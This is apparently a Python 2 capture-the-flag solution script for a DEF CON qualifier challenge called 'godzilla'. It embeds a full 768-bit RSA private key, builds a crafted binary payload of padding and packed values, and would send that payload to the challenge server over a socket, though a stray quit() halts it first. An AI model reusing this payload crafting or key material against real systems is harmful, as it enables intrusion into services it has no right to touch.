#!/bin/sh
import struct
import socket
import binascii
import time

def encode_bigint(a):
    x = str(hex(a))[2:-1]
    v = []
    xx = 0

    while xx < len(x):
        q = x[xx : xx + 2]
        v.append(q)
        xx += 2
    v.reverse()
    v = ''.join(v)
    return v

def decode_openssl_bigint(s):
    assert type(s) == list
    ret = 0

    for num in s:
        ret = ret << 8
        ret += int(num, 16)

    return ret

'''
Private-Key: (768 bit)
modulus:
    00:aa:f4:d5:76:c4:a3:22:fd:39:47:9b:19:59:26:
    f6:66:d9:13:52:06:93:40:b5:c8:fa:77:e5:9e:77:
    ff:77:02:d6:e2:e5:3c:5c:13:47:ea:47:8a:2c:b0:
    71:fb:86:12:29:fb:c6:33:14:fe:ae:6a:18:1a:47:
    df:c0:4a:3a:f5:56:e1:56:ce:4d:04:4a:ca:20:af:
    5e:01:14:04:02:47:da:69:4f:58:19:25:ce:18:9e:
    34:e3:d7:60:d2:45:25
publicExponent: 65537 (0x10001)
privateExponent:
    00:99:fa:33:59:e9:fa:55:c5:66:16:0c:a8:64:18:
    27:ce:b2:ae:28:2f:2b:ea:18:d1:90:66:f5:36:2a:
    36:ba:66:a0:4d:74:d3:4c:cb:40:f6:ce:c0:b1:47:
    ab:22:34:ba:25:6f:28:0d:f0:f6:0d:06:24:13:57:
    fc:3a:d0:7a:5b:ad:63:d0:dc:60:35:27:c2:29:1f:
    00:04:0a:5f:6f:37:6d:72:ce:bd:67:f5:9e:54:43:
    5b:e7:bb:a3:dc:8c:f1
prime1:
    00:e2:a1:34:da:db:e8:c1:4e:85:fc:db:e3:e3:0d:
    92:4d:0d:2c:bb:6b:5c:ed:99:51:71:b8:e5:be:f8:
    e5:c9:45:e9:6f:8a:3f:a1:af:aa:81:45:27:b5:00:
    3c:9e:29:8b
prime2:
    00:c1:1c:93:f5:98:cf:6f:13:69:9e:74:28:0d:d3:
    25:20:5e:a9:e9:39:8a:a6:66:d8:36:a2:54:17:a9:
    c0:cc:66:08:df:00:68:0b:d2:bf:9b:b6:4f:df:18:
    51:88:42:0f
exponent1:
    00:b6:a0:49:c3:84:2b:10:7b:82:a5:bd:5c:ea:ff:
    68:c2:06:b7:e1:60:27:46:a0:a2:6d:0e:1e:b5:c2:
    45:09:e8:f8:b0:15:ac:29:53:32:07:71:ff:09:70:
    e3:68:60:f9
exponent2:
    1b:6b:cd:6e:c0:66:24:25:a3:87:c6:82:b1:83:db:
    ef:be:c1:6d:c6:a7:f3:7d:03:12:ae:f6:35:ed:fa:
    dc:8b:58:93:21:e1:a4:5c:26:ad:1b:b4:37:bf:a2:
    44:30:ed
coefficient:
    00:dc:ce:53:e6:1b:f6:5f:65:54:71:72:59:b5:08:
    fd:fe:e4:1d:d7:5b:22:db:95:20:db:3b:15:58:e7:
    ae:26:5d:88:fa:4b:76:b3:4c:b2:2e:bb:08:b5:43:
    b2:0e:34:45
'''

modulus = '''00:aa:f4:d5:76:c4:a3:22:fd:39:47:9b:19:59:26:
f6:66:d9:13:52:06:93:40:b5:c8:fa:77:e5:9e:77:
ff:77:02:d6:e2:e5:3c:5c:13:47:ea:47:8a:2c:b0:
71:fb:86:12:29:fb:c6:33:14:fe:ae:6a:18:1a:47:
df:c0:4a:3a:f5:56:e1:56:ce:4d:04:4a:ca:20:af:
5e:01:14:04:02:47:da:69:4f:58:19:25:ce:18:9e:
34:e3:d7:60:d2:45:25
'''.strip().split(':')

modulus = decode_openssl_bigint(modulus)

private_exponent = '''00:99:fa:33:59:e9:fa:55:c5:66:16:0c:a8:64:18:
27:ce:b2:ae:28:2f:2b:ea:18:d1:90:66:f5:36:2a:
36:ba:66:a0:4d:74:d3:4c:cb:40:f6:ce:c0:b1:47:
ab:22:34:ba:25:6f:28:0d:f0:f6:0d:06:24:13:57:
fc:3a:d0:7a:5b:ad:63:d0:dc:60:35:27:c2:29:1f:
00:04:0a:5f:6f:37:6d:72:ce:bd:67:f5:9e:54:43:
5b:e7:bb:a3:dc:8c:f1
'''.strip().split(':')

private_exponent = decode_openssl_bigint(private_exponent)

print 'qN'
print '\t', modulus
print 'd'
print '\t', private_exponent
print 'encoded(qN)'
print '\t', encode_bigint(modulus)

#a = 1003103838556651507628555636330026033778617920156717988356542246694938166737814566792763905093451568623751209393228473104621241127455927948500155303095577513801000908445368656518814002954652859078574695890342113223231421454500402449
#print encode_bigint(a)

m  = '9' * 0x20
m += struct.pack('LLLL', 0x4791EB26, 0x726DA66D, 0x9345B7FC, 0x9345B7FC)
m += 'a' * 0x20

with open('x', 'w+b') as fd:
    fd.write('aaaa')
    fd.write(chr(0x17 | 0x80))
    fd.write(m)
    fd.write('\x40')
    fd.write('a' * 0x40)

with open('x', 'rb') as fd:
    data = fd.read()

quit()
s = socket.create_connection(('godzilla_3751355706cae43e14bd797a16946483.quals.shallweplayaga.me', 11578))
time.sleep(1)
s.sendall(data)
print 'sent'
time.sleep(1)

result = s.recv(99999)

print binascii.hexlify(result)

